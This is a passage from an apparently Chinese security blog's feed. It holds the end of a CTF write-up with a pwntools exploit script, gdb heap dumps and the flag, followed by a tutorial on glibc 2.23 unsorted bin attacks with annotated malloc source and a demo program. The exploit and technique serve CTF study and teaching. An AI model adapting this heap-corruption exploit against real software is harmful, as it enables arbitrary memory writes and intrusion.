class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>heap_ptr = <span class="hljs-number">0x6020E0</span><br>magic = <span class="hljs-number">0x6020C0</span><br>goal = magic - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># 申请一个small chunk</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk0</span><br><span class="hljs-comment"># 申请一个chunk1防 chunk0 合并</span><br>create(<span class="hljs-number">500</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>) + p64(goal)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">"666"</span>)<br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">"4869"</span>)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h3 id="创建两个chunk"><a href="#创建两个chunk" class="headerlink" title="创建两个chunk"></a>创建两个chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><span class="hljs-comment">//chunk0</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span> <br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><span class="hljs-comment">//chunk1</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x6262626262626262</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><p>申请的 chunk(500) 以防止合并</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65440</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span><span class="hljs-comment">//chunk3</span><br><span class="hljs-number">0x1a65450</span>:<span class="hljs-number">0x6363636363636363</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><h3 id="free掉small-chunk，被放入到-unsorted-bin-中"><a href="#free掉small-chunk，被放入到-unsorted-bin-中" class="headerlink" title="free掉small chunk，被放入到 unsorted bin 中"></a>free掉small chunk，被放入到 unsorted bin 中</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x00007f9bd595bb78</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all: <span class="hljs-number">0x1a65020</span> —▸ <span class="hljs-number">0x7f9bd595bb78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x1a65020</span><br></code></pre></td></tr></tbody></table></figure><p>被放入unsorted bin 中</p><p>观察全局变量</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020e0</span> &lt;heaparray&gt;:<span class="hljs-number">0x0000000001a65010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk1已经被<span class="hljs-built_in">free</span>掉<br><span class="hljs-number">0x6020f0</span> &lt;heaparray+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000001a65450</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h3 id="溢出到目的位置"><a href="#溢出到目的位置" class="headerlink" title="溢出到目的位置"></a>溢出到目的位置</h3><p>通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x1a65000</span><br><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000006020b0</span> <span class="hljs-comment">// bk -&gt; magic - 0x10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk"><a href="#再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk" class="headerlink" title="再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk"></a>再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020b0</span> &lt;<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>&gt;:<span class="hljs-number">0x00007f9bd595b8e0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88</p><p>最后我们输入 4869 就可以打印flag 了</p><p>flag{unsorted_bin_attack}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;unsortedbin-attack（例题）&quot;&gt;&lt;a href=&quot;#unsortedbin-attack（例题）&quot; class=&quot;headerlink&quot; title=&quot;unsortedbin_attack（例题）&quot;&gt;&lt;/a&gt;&lt;strong&gt;unsortedbin_</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>unsorted bin</title>
    <link href="https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/"/>
    <id>https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/</id>
    <published>2023-09-14T01:58:29.000Z</published>
    <updated>2023-09-13T12:59:08.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于unsorted-bin-和-unsorted-bin-attack"><a href="#关于unsorted-bin-和-unsorted-bin-attack" class="headerlink" title="关于unsorted bin 和 unsorted bin attack"></a><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p><blockquote><p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p></blockquote><h2 id="unsotedbin-基本来源"><a href="#unsotedbin-基本来源" class="headerlink" title="unsotedbin 基本来源"></a><strong>unsotedbin 基本来源</strong></h2><p>1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于<strong>MINSIZE</strong>，就会被放到unsortedbin中。</p><blockquote><p>举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中</p></blockquote><p>2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。<br>3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。</p><blockquote><p>consolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，<strong>合并</strong>;<br>因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。</p></blockquote><h2 id="unsortedbin-attack-概述"><a href="#unsortedbin-attack-概述" class="headerlink" title="unsortedbin_attack 概述"></a>unsortedbin_attack 概述</h2><p>● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 <strong>bk</strong> <strong>指针</strong>。</p><h2 id="unsortedbin-attack-效果"><a href="#unsortedbin-attack-效果" class="headerlink" title="unsortedbin_attack 效果"></a>unsortedbin_attack 效果</h2><p>● <strong>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</strong></p><h2 id="unsortedbin-源码分析"><a href="#unsortedbin-源码分析" class="headerlink" title="unsortedbin 源码分析"></a>unsortedbin 源码分析</h2><blockquote><p>这里使用libc-2.23版本的源码<br>下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。<br>最重要的是最后的总结，记住就行了。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>#取链表尾部的chunk记作victim<br>        {<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            {<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                {<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                }<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>      #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            {<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            {<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            }<br>          <span class="hljs-keyword">else</span><br>            {<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                {<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    {<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    }<br>                  <span class="hljs-keyword">else</span><br>                    {<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        {<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        }<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        {<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        }<br>                      bck = fwd-&gt;bk;<br>                    }<br>                }<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            }<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        }<br></code></pre></td></tr></tbody></table></figure><h2 id="unsortedbin-attack-原理"><a href="#unsortedbin-attack-原理" class="headerlink" title="unsortedbin_attack 原理"></a>unsortedbin_attack 原理</h2><p>从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure><p>换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来演示unsortedbin_attack的原理：</p><blockquote><p>来源：<a href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>}<br></code></pre></td></tr></tbody></table></figure><p>大致看一下流程，然后开始进行调试。</p><blockquote><p>编译命令：gcc -g demo.c -o demo</p></blockquote><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先对代码的第12行下断点，开始调试程序：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 